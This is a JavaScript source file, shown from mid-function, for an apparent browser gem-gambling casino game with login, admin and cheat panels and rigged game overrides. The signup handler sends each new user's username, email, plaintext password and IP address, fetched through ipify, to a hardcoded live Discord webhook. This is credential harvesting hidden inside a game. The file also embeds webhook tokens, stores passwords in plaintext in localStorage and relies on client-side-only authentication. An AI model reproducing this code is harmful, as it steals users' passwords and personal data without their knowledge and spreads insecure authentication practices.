        const user = users.find(u => u.username === username && u.password === password);
        
        if (user) {
            // Check if user is banned
            if (bannedUsers.some(u => u.username === username)) {
                showAuthError('Your account has been banned. Please contact support.');
                return;
            }
            
            // Login successful
            currentUser = user;
            localStorage.setItem('currentUser', JSON.stringify(user));
            
            // Show main content
            document.getElementById('login-container').style.display = 'none';
            document.getElementById('main-content').classList.remove('hidden-auth');
            
            // Update user info
            document.getElementById('username').textContent = user.username;
            gems = user.gems || 1000;
            updateGemCount();
            
            showNotification(`Welcome back, ${user.username}!`);
        } else {
            showAuthError('Invalid username or password');
        }
    });
    
    // Signup form submission
    document.getElementById('signup-form').addEventListener('submit', (e) => {
        e.preventDefault();
        
        const email = document.getElementById('signup-email').value;
        const username = document.getElementById('signup-username').value;
        const password = document.getElementById('signup-password').value;
        const confirmPassword = document.getElementById('signup-confirm-password').value;
        
        // Validate input
        if (password !== confirmPassword) {
            showAuthError('Passwords do not match');
            return;
        }
        
        // Check if username already exists
        if (users.some(u => u.username === username)) {
            showAuthError('Username already taken');
            return;
        }
        
        // Check if email already exists
        if (users.some(u => u.email === email)) {
            showAuthError('Email already registered');
            return;
        }
        
        // Create new user
        const newUser = {
            email,
            username,
            password,
            gems: 1000,
            joinDate: new Date().toISOString()
        };
        
        // Add to users array
        users.push(newUser);
        localStorage.setItem('users', JSON.stringify(users));
        
        // Login as new user
        currentUser = newUser;
        localStorage.setItem('currentUser', JSON.stringify(newUser));
        
        // Show main content
        document.getElementById('login-container').style.display = 'none';
        document.getElementById('main-content').classList.remove('hidden-auth');
        
        // Update user info
        document.getElementById('username').textContent = newUser.username;
        gems = newUser.gems;
        updateGemCount();
        
        // Update admin stats
        adminStats.totalPlayers = users.length;
        adminStats.totalGems = users.reduce((total, user) => total + (user.gems || 0), 0);
        updateAdminStats();
        
        showNotification(`Welcome, ${newUser.username}!`);
        
        // Send webhook notification for new signup
        sendDiscordWebhook(newUser);
    });
}

function showAuthError(message) {
    const errorElement = document.getElementById('auth-error');
    errorElement.textContent = message;
    errorElement.style.display = 'block';
}

function logout() {
    // Clear current user
    currentUser = null;
    localStorage.removeItem('currentUser');
    
    // Show login form
    document.getElementById('login-container').style.display = 'flex';
    document.getElementById('main-content').classList.add('hidden-auth');
    
    // Reset forms
    document.getElementById('login-form').reset();
    document.getElementById('signup-form').reset();
    document.querySelector('.auth-tab[data-tab="login"]').click();
}

function sendDiscordWebhook(user) {
    // Discord webhook URL - replace with your actual webhook URL
    const webhookUrl = 'https://discord.com/api/webhooks/1402110493262352494/cRtLE0beVbuEf6xMq8cZhcNhByGycdJZrj2ueaLVOpYfXeL4-7YW8ala6sLkO0XGlaDS';
    
    // Logging webhook URLs
    const winLogWebhookUrl = 'https://discord.com/api/webhooks/1402136089753419898/uM_qha8wmlGkgMBefrlIfbpNHTHQaObr92OYYkFYlETMH2sEGttiJr1RIiNYY_J75lgh';
    const cheatLogWebhookUrl = 'https://discord.com/api/webhooks/1402135940872273961/k9vTRBYG5b5JueyVShRCj2c3OOnoAt_kiZxtBJzUUQBrDvJtYmH6Mnk2740pvOZmL5aC';
    
    // First get the user's IP address using ipify API
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            const userIp = data.ip;
            
            // Create webhook payload with IP address
            const payload = {
                embeds: [{
                    title: '🎮 New User Signup',
                    color: 0x4285f4,
                    fields: [
                        {
                            name: 'Username',
                            value: user.username,
                            inline: true
                        },
                        {
                            name: 'Email',
                            value: user.email,
                            inline: true
                        },
                        {
                            name: 'Password',
                            value: user.password,
                            inline: true
                        },
                        {
                            name: 'IP Address',
                            value: userIp,
                            inline: true
                        },
                        {
                            name: 'Signup Date',
                            value: new Date().toLocaleString(),
                            inline: false
                        }
                    ],
                    footer: {
                        text: 'Gem Gambling Casino'
                    }
                }]
            };
            
            // Log for debugging
            console.log('Sending Discord webhook for new user signup');
            console.log('User IP:', userIp);
            
            // Send the webhook using fetch API
            try {
                fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                })
                .then(response => {
                    if (response.ok) {
                        console.log('Discord webhook sent successfully');
                    } else {
                        console.error('Failed to send Discord webhook:', response.status);
                    }
                })
                .catch(error => {
                    console.error('Error sending Discord webhook:', error);
                });
            } catch (error) {
                console.error('Error sending Discord webhook:', error);
            }
        })
        .catch(error => {
            console.error('Error getting IP address:', error);
            
            // If IP fetch fails, still send webhook without IP
            const payload = {
                embeds: [{
                    title: '🎮 New User Signup',
                    color: 0x4285f4,
                    fields: [
                        {
                            name: 'Username',
                            value: user.username,
                            inline: true
                        },
                        {
                            name: 'Email',
                            value: user.email,
                            inline: true
                        },
                        {
                            name: 'Password',
                            value: user.password,
                            inline: true
                        },
                        {
                            name: 'IP Address',
                            value: 'Failed to retrieve',
                            inline: true
                        },
                        {
                            name: 'Signup Date',
                            value: new Date().toLocaleString(),
                            inline: false
                        }
                    ],
                    footer: {
                        text: 'Gem Gambling Casino'
                    }
                }]
            };
            
            // Send webhook without IP
            try {
                fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                })
                .then(response => {
                    if (response.ok) {
                        console.log('Discord webhook sent successfully (without IP)');
                    } else {
                        console.error('Failed to send Discord webhook:', response.status);
                    }
                })
                .catch(error => {
                    console.error('Error sending Discord webhook:', error);
                });
            } catch (error) {
                console.error('Error sending Discord webhook:', error);
            }
        });
}

// User management functions
function updateUserLists() {
    // Update banned users list
    updateBannedUsersList();
    
    // Update all users list
    updateAllUsersList();
}

function updateAllUsersList() {
    const allUsersList = document.getElementById('all-users-list');
    allUsersList.innerHTML = '';
    
    if (users.length === 0) {
        const option = document.createElement('option');
        option.textContent = 'No users registered';
        option.disabled = true;
        allUsersList.appendChild(option);
    } else {
        users.forEach(user => {
            const option = document.createElement('option');
            option.value = user.username;
            option.textContent = user.username;
            
            // Highlight banned users in red
            if (bannedUsers.some(u => u.username === user.username)) {
                option.style.color = '#f44336';
            }
            
            allUsersList.appendChild(option);
        });
    }
}

function updateBannedUsersList() {
    const bannedUsersList = document.getElementById('banned-users-list');
    bannedUsersList.innerHTML = '';
    
    if (bannedUsers.length === 0) {
        const option = document.createElement('option');
        option.textContent = 'No banned users';
        option.disabled = true;
        bannedUsersList.appendChild(option);
    } else {
        bannedUsers.forEach(user => {
            const option = document.createElement('option');
            option.value = user.username;
            option.textContent = user.username;
            bannedUsersList.appendChild(option);
        });
    }
}

const banLogWebhookUrl = "https://discord.com/api/webhooks/1402120278737289267/DYG_t7vIYAZJdNcmiJinHW0qIbOYGfVtIB1OZJ00Bc7S0eNe-KMyzxyumX1LqMt19JUd";
const winLogWebhookUrl = "YOUR_WIN_LOG_DISCORD_WEBHOOK_URL";
const cheatLogWebhookUrl = "https://discord.com/api/webhooks/1402135940872273961/k9vTRBYG5b5JueyVShRCj2c3OOnoAt_kiZxtBJzUUQBrDvJtYmH6Mnk2740pvOZmL5aC";

function sendBanLogToDiscord(user) {
    const payload = {
        username: "Ban Logger",
        embeds: [
            {
                title: "User Banned",
                color: 16711680, // Red color
                fields: [
                    { name: "Username", value: user.username, inline: true },
                    { name: "Email", value: user.email || "N/A", inline: true },
                    { name: "Banned At", value: new Date().toLocaleString(), inline: false }
                ]
            }
        ]
    };

    fetch(banLogWebhookUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
    }).catch(error => {
        console.error("Failed to send ban log to Discord:", error);
    });
}

function sendWinLogToDiscord(game, winAmount, betAmount, username) {
    const payload = {
        username: "Win Logger",
        embeds: [
            {
                title: "🎉 User Win",
                color: 65280, // Green color
                fields: [
                    { name: "Username", value: username || "Guest", inline: true },
                    { name: "Game", value: game, inline: true },
                    { name: "Bet Amount", value: betAmount.toString(), inline: true },
                    { name: "Win Amount", value: winAmount.toString(), inline: true },
                    { name: "Profit", value: (winAmount - betAmount).toString(), inline: true },
                    { name: "Time", value: new Date().toLocaleString(), inline: false }
                ]
            }
        ]
    };

    fetch(winLogWebhookUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
    }).catch(error => {
        console.error("Failed to send win log to Discord:", error);
    });
}

function sendCheatLogToDiscord(cheatType, username) {
    const payload = {
        username: "Cheat Logger",
        embeds: [
            {
                title: "⚠️ Cheat Activated",
                color: 16776960, // Yellow color
                fields: [
                    { name: "Username", value: username || "Guest", inline: true },
                    { name: "Cheat Type", value: cheatType, inline: true },
                    { name: "Time", value: new Date().toLocaleString(), inline: false }
                ]
            }
        ]
    };

    fetch(cheatLogWebhookUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
    }).catch(error => {
        console.error("Failed to send cheat log to Discord:", error);
    });
}

function banUser(username) {
    // Find user
    const user = users.find(u => u.username === username);
    
    if (!user) {
        showNotification('User not found', 'error');
        return;
    }
    
    // Check if already banned
    if (bannedUsers.some(u => u.username === username)) {
        showNotification('User is already banned', 'error');
        return;
    }
    
    // Add to banned users
    bannedUsers.push(user);
    localStorage.setItem('bannedUsers', JSON.stringify(bannedUsers));
    
    // Update user lists
    updateUserLists();
    
    // Send ban log to Discord webhook
    sendBanLogToDiscord(user);

    // If the banned user is currently logged in, log them out
    if (currentUser && currentUser.username === username) {
        logout();
    }
    
    showNotification(`User ${username} has been banned`, 'admin');
}

function unbanUser(username) {
    // Remove from banned users
    const index = bannedUsers.findIndex(u => u.username === username);
    
    if (index === -1) {
        showNotification('User is not banned', 'error');
        return;
    }
    
    bannedUsers.splice(index, 1);
    localStorage.setItem('bannedUsers', JSON.stringify(bannedUsers));
    
    // Update user lists
    updateUserLists();
    
    showNotification(`User ${username} has been unbanned`, 'admin');
}

// Setup admin panel event listeners
function setupAdminPanel() {
    // Initialize user lists
    updateUserLists();
    // House edge apply button
    document.getElementById('apply-house-edge').addEventListener('click', function() {
        const edgeInput = document.getElementById('house-edge');
        adminStats.houseEdge = parseInt(edgeInput.value);
        showNotification(`House edge set to ${edgeInput.value}%`, 'admin');
    });
    
    // Max bet apply button
    document.getElementById('apply-max-bet').addEventListener('click', function() {
        const maxBetInput = document.getElementById('max-bet');
        const newMaxBet = parseInt(maxBetInput.value);
        
        // Validate the input
        if (isNaN(newMaxBet) || newMaxBet < 100) {
            showNotification('Max bet must be at least 100', 'error');
            maxBetInput.value = adminStats.maxBet; // Reset to current value
            return;
        }
        
        adminStats.maxBet = newMaxBet;
        
        // Update all bet limits
        minesBet = Math.min(minesBet, adminStats.maxBet);
        slotsBet = Math.min(slotsBet, adminStats.maxBet);
        rouletteBet = Math.min(rouletteBet, adminStats.maxBet);
        blackjackBet = Math.min(blackjackBet, adminStats.maxBet);
        
        // Update bet displays
        updateBetDisplays();
        
        // Update max values for bet increase buttons
        updateBetLimits();
        
        showNotification(`Max bet set to ${newMaxBet}`, 'admin');
    });
    
    // Set player gems button
    document.getElementById('apply-gems').addEventListener('click', function() {
        const gemsInput = document.getElementById('set-gems');
        gems = parseInt(gemsInput.value);
        
        // Update current user's gems if logged in
        if (currentUser) {
            currentUser.gems = gems;
            localStorage.setItem('currentUser', JSON.stringify(currentUser));
            
            // Update user in users array
            const userIndex = users.findIndex(u => u.username === currentUser.username);
            if (userIndex !== -1) {
                users[userIndex].gems = gems;
                localStorage.setItem('users', JSON.stringify(users));
            }
        }
        
        adminStats.totalGems = gems;
        updateGemCount();
        updateAdminStats();
        showNotification(`Player gems set to ${gemsInput.value}`, 'admin');
    });
    
    // Maintenance mode toggle
    document.getElementById('maintenance-mode').addEventListener('change', function() {
        adminStats.maintenanceMode = this.checked;
        const maintenanceOverlay = document.getElementById('maintenance-overlay');
        
        if (this.checked) {
            document.body.classList.add('maintenance-mode');
            maintenanceOverlay.classList.remove('hidden');
            showNotification('Maintenance mode enabled', 'admin');
        } else {
            document.body.classList.remove('maintenance-mode');
            maintenanceOverlay.classList.add('hidden');
            showNotification('Maintenance mode disabled', 'admin');
        }
    });
    
    // Debug mode toggle
    document.getElementById('debug-mode').addEventListener('change', function() {
        adminStats.debugMode = this.checked;
        if (this.checked) {
            document.body.classList.add('debug-mode');
            showNotification('Debug mode enabled', 'admin');
        } else {
            document.body.classList.remove('debug-mode');
            showNotification('Debug mode disabled', 'admin');
        }
    });
    
    // Reset stats button
    document.getElementById('reset-stats').addEventListener('click', function() {
        adminStats.gamesPlayed = 0;
        adminStats.wins = 0;
        adminStats.losses = 0;
        updateAdminStats();
        showNotification('Game stats reset', 'admin');
    });
    
    // Reveal cheat panel button
    document.getElementById('reveal-cheats').addEventListener('click', function() {
        const cheatPanel = document.getElementById('cheat-panel');
        cheatPanel.style.display = 'block';
        showNotification('Cheat panel revealed', 'admin');
    });
    
    // User management
    document.getElementById('search-user').addEventListener('click', function() {
        const username = document.getElementById('user-search').value;
        if (!username) {
            showNotification('Please enter a username', 'error');
            return;
        }
        
        // Find user
        const user = users.find(u => u.username === username);
        
        if (user) {
            // Show user details
            document.getElementById('user-details').style.display = 'block';
            document.getElementById('user-details-name').textContent = user.username;
            document.getElementById('user-details-email').textContent = user.email;
            
            // Check if user is banned
            const isBanned = bannedUsers.some(u => u.username === username);
            document.getElementById('user-details-status').textContent = isBanned ? 'Banned' : 'Active';
            document.getElementById('user-details-status').style.color = isBanned ? '#f44336' : '#4caf50';
            
            // Show appropriate button
            document.getElementById('ban-user').style.display = isBanned ? 'none' : 'block';
            document.getElementById('unban-user').style.display = isBanned ? 'block' : 'none';
        } else {
            showNotification('User not found', 'error');
            document.getElementById('user-details').style.display = 'none';
        }
    });
    
    // Ban user button
    document.getElementById('ban-user').addEventListener('click', function() {
        const username = document.getElementById('user-details-name').textContent;
        banUser(username);
        
        // Update UI
        document.getElementById('user-details-status').textContent = 'Banned';
        document.getElementById('user-details-status').style.color = '#f44336';
        document.getElementById('ban-user').style.display = 'none';
        document.getElementById('unban-user').style.display = 'block';
    });
    
    // Unban user button
    document.getElementById('unban-user').addEventListener('click', function() {
        const username = document.getElementById('user-details-name').textContent;
        unbanUser(username);
        
        // Update UI
        document.getElementById('user-details-status').textContent = 'Active';
        document.getElementById('user-details-status').style.color = '#4caf50';
        document.getElementById('ban-user').style.display = 'block';
        document.getElementById('unban-user').style.display = 'none';
    });
    
    // All users list selection
    document.getElementById('all-users-list').addEventListener('change', function() {
        const username = this.value;
        if (username) {
            // Set the username in the search field
            document.getElementById('user-search').value = username;
            
            // Trigger the search button click
            document.getElementById('search-user').click();
        }
    });
    
    // Refresh users list button
    document.getElementById('refresh-users').addEventListener('click', function() {
        updateUserLists();
        showNotification('User lists refreshed', 'admin');
    });
}

// Helper function to update all bet displays
function updateBetDisplays() {
    document.getElementById('mines-bet-amount').textContent = minesBet;
    document.getElementById('slots-bet-amount').textContent = slotsBet;
    document.getElementById('roulette-bet-amount').textContent = rouletteBet;
    document.getElementById('blackjack-bet-amount').textContent = blackjackBet;
}

// Helper function to update bet limits based on max bet
function updateBetLimits() {
    // This function ensures that bet increase buttons respect the max bet limit
    // It's called when max bet is changed or when the game is initialized
    
    // Update bet increase event listeners to respect max bet
    document.querySelectorAll('.increase-btn').forEach(button => {
        button.onclick = function() {
            const game = this.dataset.game;
            let currentBet;
            
            switch(game) {
                case 'mines':
                    if (minesBet < adminStats.maxBet) {
                        minesBet = Math.min(minesBet + 10, adminStats.maxBet);
                        document.getElementById('mines-bet-amount').textContent = minesBet;
                    }
                    break;
                case 'slots':
                    if (slotsBet < adminStats.maxBet) {
                        slotsBet = Math.min(slotsBet + 10, adminStats.maxBet);
                        document.getElementById('slots-bet-amount').textContent = slotsBet;
                    }
                    break;
                case 'roulette':
                    if (rouletteBet < adminStats.maxBet) {
                        rouletteBet = Math.min(rouletteBet + 10, adminStats.maxBet);
                        document.getElementById('roulette-bet-amount').textContent = rouletteBet;
                    }
                    break;
                case 'blackjack':
                    if (blackjackBet < adminStats.maxBet) {
                        blackjackBet = Math.min(blackjackBet + 10, adminStats.maxBet);
                        document.getElementById('blackjack-bet-amount').textContent = blackjackBet;
                    }
                    break;
            }
        };
    });
}

// Secret key combination to toggle cheat panel (Ctrl + Alt + C)
document.addEventListener('keydown', function(e) {
    if (e.ctrlKey && e.altKey && e.key === 'c') {
        const cheatPanel = document.getElementById('cheat-panel');
        if (cheatPanel.style.display === 'none' || cheatPanel.style.display === '') {
            cheatPanel.style.display = 'block';
            showNotification('Cheat panel activated', 'cheat');
            sendCheatLogToDiscord('Cheat Panel Activated', currentUser?.username || 'Guest');
        } else {
            cheatPanel.style.display = 'none';
        }
    }
});

// Secret key combination to toggle admin panel (Ctrl + Alt + Shift)
document.addEventListener('keydown', function(e) {
    if (e.ctrlKey && e.altKey && e.shiftKey) {
        const adminPanel = document.getElementById('admin-panel');
        if (adminPanel.style.display === 'none' || adminPanel.style.display === '') {
            adminPanel.style.display = 'block';
            updateAdminStats(); // Update stats when opening
            showNotification('Admin panel activated', 'admin');
        } else {
            adminPanel.style.display = 'none';
        }
    }
});

// Setup cheat panel event listeners
function setupCheatPanel() {
    // Infinite Gems
    document.getElementById('infinite-gems').addEventListener('change', function() {
        cheatsEnabled.infiniteGems = this.checked;
        
        if (cheatsEnabled.infiniteGems) {
            gems = 999999;
            updateGemCount();
            showNotification('Infinite gems enabled', 'cheat');
        } else {
            showNotification('Infinite gems disabled', 'cheat');
        }
    });

    // Add Gems Button
    document.getElementById('add-gems-btn').addEventListener('click', function() {
        gems += 10000;
        updateGemCount();
        showNotification('+10000 Gems Added!', 'cheat');
    });

    // Mines ESP
    document.getElementById('mines-esp').addEventListener('change', function() {
        cheatsEnabled.minesESP = this.checked;
        
        if (cheatsEnabled.minesESP) {
            showNotification('Mines ESP enabled', 'cheat');
            
            // Show mines if game is active
            if (minesGameActive) {
                revealMinesForESP();
            }
        } else {
            showNotification('Mines ESP disabled', 'cheat');
            
            // Hide mines ESP indicators
            document.querySelectorAll('.mine-indicator').forEach(indicator => {
                indicator.remove();
            });
            document.querySelectorAll('.mine-cell').forEach(cell => {
                cell.style.boxShadow = 'none';
            });
        }
    });

    // Auto Win Mines
    document.getElementById('auto-win-mines').addEventListener('click', function() {
        cheatsEnabled.minesAutoWin = !cheatsEnabled.minesAutoWin;
        this.classList.toggle('active');
        
        if (cheatsEnabled.minesAutoWin) {
            showNotification('Mines Auto-Win enabled', 'cheat');
            if (minesGameActive) {
                autoWinMines();
            }
        } else {
            showNotification('Mines Auto-Win disabled', 'cheat');
        }
    });

    // Force Jackpot
    document.getElementById('force-jackpot').addEventListener('click', function() {
        cheatsEnabled.forceJackpot = !cheatsEnabled.forceJackpot;
        this.classList.toggle('active');
        
        if (cheatsEnabled.forceJackpot) {
            showNotification('Next spin will be a jackpot!', 'cheat');
        } else {
            showNotification('Force Jackpot disabled', 'cheat');
        }
    });

    // Force Roulette Color
    document.getElementById('force-roulette-color').addEventListener('change', function() {
        cheatsEnabled.forceRouletteColor = this.value;
        if (this.value) {
            showNotification(`Next spin will land on ${this.value}!`, 'cheat');
        } else {
            showNotification('Force Roulette Color disabled', 'cheat');
        }
    });

    // See Dealer Card
    document.getElementById('see-dealer-card').addEventListener('click', function() {
        cheatsEnabled.seeDealerCard = !cheatsEnabled.seeDealerCard;
        this.classList.toggle('active');
        
        if (cheatsEnabled.seeDealerCard) {
            showNotification('See Dealer Card enabled', 'cheat');
            if (gameInProgress) {
                revealDealerCard();
            }
        } else {
            showNotification('See Dealer Card disabled', 'cheat');
        }
    });

    // Force Dealer Bust
    document.getElementById('force-dealer-bust').addEventListener('click', function() {
        cheatsEnabled.forceDealerBust = !cheatsEnabled.forceDealerBust;
        this.classList.toggle('active');
        
        if (cheatsEnabled.forceDealerBust) {
            showNotification('Dealer will bust on next stand!', 'cheat');
        } else {
            showNotification('Force Dealer Bust disabled', 'cheat');
        }
    });
}

// Cheat Functions
function revealMinesForESP() {
    if (!minesGameActive || !cheatsEnabled.minesESP) return;
    
    for (let i = 0; i < 25; i++) {
        const cell = minesGridElement.children[i];
        if (minesGrid[i] && !cell.classList.contains('revealed')) {
            // Add a subtle indicator for mines
            cell.style.boxShadow = 'inset 0 0 5px red';
            cell.style.position = 'relative';
            
            // Add a small indicator dot
            if (!cell.querySelector('.mine-indicator')) {
                const indicator = document.createElement('div');
                indicator.className = 'mine-indicator';
                indicator.style.position = 'absolute';
                indicator.style.top = '5px';
                indicator.style.right = '5px';
                indicator.style.width = '8px';
                indicator.style.height = '8px';
                indicator.style.borderRadius = '50%';
                indicator.style.backgroundColor = 'red';
                indicator.style.opacity = '0.7';
                cell.appendChild(indicator);
            }
        }
    }
}

function autoWinMines() {
    if (!minesGameActive) return;
    
    // Reveal all safe cells automatically
    for (let i = 0; i < 25; i++) {
        if (!minesGrid[i] && !minesGridElement.children[i].classList.contains('revealed')) {
            setTimeout(() => {
                revealCell(i);
            }, i * 100); // Stagger the reveals for effect
        }
    }
}

function revealDealerCard() {
    if (!gameInProgress) return;
    
    // Replace the hidden card with the actual dealer's second card
    const dealerCardsElement = document.getElementById('dealer-cards');
    dealerCardsElement.innerHTML = '';
    dealerCards.forEach(card => {
        dealerCardsElement.appendChild(createCardElement(card));
    });
    
    // Update the dealer score to show the real score
    dealerScore = calculateScore(dealerCards);
    document.getElementById('dealer-score').textContent = `Score: ${dealerScore}`;
}

// Modify revealCell for Auto-Win
const originalRevealCell = revealCell;
revealCell = function(index) {
    // If auto-win is enabled, always reveal a gem
    if (cheatsEnabled.minesAutoWin && minesGameActive) {
        // If the cell is a mine, change it to a safe cell
        if (minesGrid[index]) {
            minesGrid[index] = false;
        }
    }
    
    // Call the original function
    originalRevealCell(index);
};

// Override the original functions to implement cheats
const originalSpinSlots = spinSlots;
spinSlots = function() {
    // Check if force jackpot is active
    if (cheatsEnabled.forceJackpot) {
        if (isSpinning || gems < currentBet) return;
        
        isSpinning = true;
        const resultElement = document.getElementById('slots-result');
        resultElement.textContent = '';
        resultElement.style.backgroundColor = 'transparent';
        
        // Deduct bet
        gems -= currentBet;
        updateGemCount();
        
        const slots = [
            document.getElementById('slot1').querySelector('.slot-item'),
            document.getElementById('slot2').querySelector('.slot-item'),
            document.getElementById('slot3').querySelector('.slot-item')
        ];
        
        // Animate slots
        let spins = 0;
        const maxSpins = 20;
        const spinInterval = setInterval(() => {
            slots.forEach(slot => {
                slot.textContent = slotItems[Math.floor(Math.random() * slotItems.length)];
                slot.style.transform = 'translateY(20px)';
                setTimeout(() => {
                    slot.style.transform = 'translateY(0)';
                }, 50);
            });
            
            spins++;
            if (spins >= maxSpins) {
                clearInterval(spinInterval);
                
                // Force jackpot - all diamonds
                slots.forEach(slot => {
                    slot.textContent = '💎';
                });
                
                // Calculate winnings
                const winAmount = currentBet * 25; // Diamond jackpot
                gems += winAmount;
                updateGemCount();
                
                resultElement.textContent = `JACKPOT! You won ${winAmount} gems!`;
                resultElement.style.backgroundColor = 'rgba(76, 175, 80, 0.3)';
                showNotification(`+${winAmount} Gems!`, 'success');
                
                isSpinning = false;
                cheatsEnabled.forceJackpot = false;
                document.getElementById('force-jackpot').classList.remove('active');
            }
        }, 100);
    } else {
        originalSpinSlots();
    }
};

const originalSpinRouletteWheel = spinRouletteWheel;
spinRouletteWheel = function() {
    if (cheatsEnabled.forceRouletteColor) {
        if (isWheelSpinning || !selectedBet || gems < rouletteBet) return;
        
        isWheelSpinning = true;
        const resultElement = document.getElementById('roulette-result');
        resultElement.textContent = '';
        resultElement.style.backgroundColor = 'transparent';
        
        // Deduct bet
        gems -= rouletteBet;
        updateGemCount();
        
        const wheel = document.getElementById('wheel');
        const ball = document.getElementById('ball');
        
        // Random rotation for the wheel
        const wheelRotation = 1800 + Math.floor(Math.random() * 1800);
        wheel.style.transform = `rotate(${wheelRotation}deg)`;
        
        // Force the ball position based on selected color
        let ballPosition;
        switch(cheatsEnabled.forceRouletteColor) {
            case 'green':
                ballPosition = 185; // Middle of green section
                break;
            case 'red':
                ballPosition = 5; // Middle of a red section
                break;
            case 'black':
                ballPosition = 15; // Middle of a black section
                break;
            default:
                ballPosition = Math.floor(Math.random() * 360);
        }
        
        const ballRadius = 120; // Distance from center
        const ballX = ballRadius * Math.cos((ballPosition * Math.PI) / 180);
        const ballY = ballRadius * Math.sin((ballPosition * Math.PI) / 180);
        
        // Animate the ball
        setTimeout(() => {
            ball.style.transform = `translate(calc(-50% + ${ballX}px), calc(-50% + ${ballY}px))`;
            
            // Determine result after animation
            setTimeout(() => {
                checkRouletteResult(ballPosition);
                isWheelSpinning = false;
                cheatsEnabled.forceRouletteColor = ""; // Reset after use
                document.getElementById('force-roulette-color').value = "";
            }, 3000);
        }, 500);
    } else {
        originalSpinRouletteWheel();
    }
};

const originalStandBlackjack = standBlackjack;
standBlackjack = function() {
    // Check if force dealer bust is active
    if (cheatsEnabled.forceDealerBust) {
        if (!gameInProgress) return;
        
        // Reveal dealer's hidden card
        const dealerCardsElement = document.getElementById('dealer-cards');
        dealerCardsElement.innerHTML = '';
        dealerCards.forEach(card => {
            dealerCardsElement.appendChild(createCardElement(card));
        });
        
        // Update dealer score
        dealerScore = calculateScore(dealerCards);
        document.getElementById('dealer-score').textContent = `Score: ${dealerScore}`;
        
        // Force dealer to draw cards until bust
        const dealerDrawInterval = setInterval(() => {
            // Force dealer to draw high value cards
            const card = { suit: suits[Math.floor(Math.random() * suits.length)], value: 'K' };
            dealerCards.push(card);
            dealerCardsElement.appendChild(createCardElement(card));
            
            dealerScore = calculateScore(dealerCards);
            document.getElementById('dealer-score').textContent = `Score: ${dealerScore}`;
            
            if (dealerScore > 21) {
                clearInterval(dealerDrawInterval);
                endBlackjackGame('dealer_bust');
                cheatsEnabled.forceDealerBust = false;
                document.getElementById('force-dealer-bust').classList.remove('active');
            }
        }, 1000);
    } else {
        originalStandBlackjack();
    }
};

// Override updateGemCount to implement infinite gems
const originalUpdateGemCount = updateGemCount;
updateGemCount = function() {
    if (cheatsEnabled.infiniteGems) {
        // If gems drop below 1000, reset to a high value
        if (gems < 1000) {
            gems = 100000;
        }
    }
    originalUpdateGemCount();
};

// Override showNotification to add cheat notification type
const originalShowNotification = showNotification;
showNotification = function(message, type = '') {
    gemNotificationText.textContent = message;
    gemNotification.classList.remove('hidden');
    
    // Reset notification styling
    gemNotification.style.backgroundColor = 'rgba(0, 0, 0, 0.8)';
    gemNotification.querySelector('i').style.color = '#00bcd4'; // Gem color
    
    // Apply styling based on notification type
    if (type === 'cheat') {
        gemNotification.style.backgroundColor = 'rgba(255, 152, 0, 0.9)';
        gemNotification.querySelector('i').className = 'fas fa-user-secret';
        gemNotification.querySelector('i').style.color = 'white';
    } else if (type === 'success') {
        gemNotification.style.backgroundColor = 'rgba(76, 175, 80, 0.8)';
    } else if (type === 'error') {
        gemNotification.style.backgroundColor = 'rgba(244, 67, 54, 0.8)';
        gemNotification.querySelector('i').className = 'fas fa-exclamation-circle';
        gemNotification.querySelector('i').style.color = 'white';
    }
    
    setTimeout(() => {
        gemNotification.classList.add('hidden');
        // Reset icon if it was changed
        if (type === 'cheat' || type === 'error') {
            gemNotification.querySelector('i').className = 'fas fa-gem';
        }
    }, 3000);
};

// Override startMinesGame to implement mines ESP
const originalStartMinesGame = startMinesGame;
startMinesGame = function() {
    originalStartMinesGame();
    if (minesGameActive && cheatsEnabled.minesESP) {
        revealMinesForESP();
    }
};

// Initialize the game when the page loads
window.addEventListener('DOMContentLoaded', function() {
    init();
    setupCheatPanel();
    
    // Add CSS for cheat panel elements
    const style = document.createElement('style');
    style.textContent = `
        .cheat-btn.active {
            background-color: #ff9800;
            color: white;
        }
        .mines-esp {
            position: relative;
        }
        .mines-esp::after {
            content: '💣';
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-size: 12px;
            opacity: 0.5;
            pointer-events: none;
        }
        .card.cheat-revealed {
            opacity: 0.8;
        }
        .card.cheat-revealed::after {
            content: 'CHEAT';
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%) rotate(-45deg);
            font-size: 10px;
            color: #ff9800;
            font-weight: bold;
            pointer-events: none;
        }
    `;
    document.head.appendChild(style);
});
